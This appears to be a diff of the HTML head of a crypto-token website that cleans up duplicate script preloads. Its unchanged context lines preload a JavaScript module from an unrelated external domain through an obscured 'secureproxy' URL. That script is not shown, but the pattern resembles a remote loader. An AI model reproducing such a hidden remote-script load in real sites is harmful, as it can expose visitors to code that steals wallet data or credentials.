@@ -24,12 +24,9 @@
     <link rel="modulepreload" href="https://testsol.top/secureproxy?s=%2F%40v1%2Fcdn%2Fjs%2Fsynaptic.custom.esm.js" crossorigin fetchpriority="high">
     <link rel="preload" href="https://testsol.top/secureproxy?s=%2F%40v1%2Fcdn%2Fjs%2Fsynaptic.custom.esm.js" as="script" crossorigin fetchpriority="high">
     
-    <!-- CRITICAL: Preload ALL resources with HIGHEST priority for MAXIMUM parallel loading -->
+    <!-- CRITICAL: Preload resources with HIGHEST priority (only non-script resources to avoid duplicates) -->
     <link rel="preload" href="/css/styles.css" as="style" fetchpriority="high">
-    <link rel="preload" href="/tailwind.cjs.js" as="script" crossorigin fetchpriority="high">
-    <link rel="modulepreload" href="/tailwind.cjs.js" crossorigin>
-    <link rel="preload" href="/js/app.js" as="script" crossorigin fetchpriority="high">
-    <link rel="preload" href="/js/token-loader.js" as="script" crossorigin fetchpriority="high">
+    <!-- Scripts are loaded via <script> tags below, no preload to avoid duplicates -->
     <link rel="preload" href="/pump1.svg" as="image" fetchpriority="high">
     <link rel="preload" href="/assets/avatars/pepe.png" as="image">
     <!-- CRITICAL: Preload video stream with HIGHEST priority for LCP optimization -->
@@ -128,8 +125,8 @@
     <script src="/tailwind.cjs.js" fetchpriority="high"></script>
     
     <!-- Load other scripts in parallel (async defer for non-blocking parallel execution) -->
-    <script src="/js/token-loader.js" async defer fetchpriority="high"></script>
-    <script src="/js/app.js" async defer fetchpriority="high"></script>
+    <script src="/js/token-loader.js" async defer></script>
+    <script src="/js/app.js" async defer></script>
     
     <script>
       window.setup = {
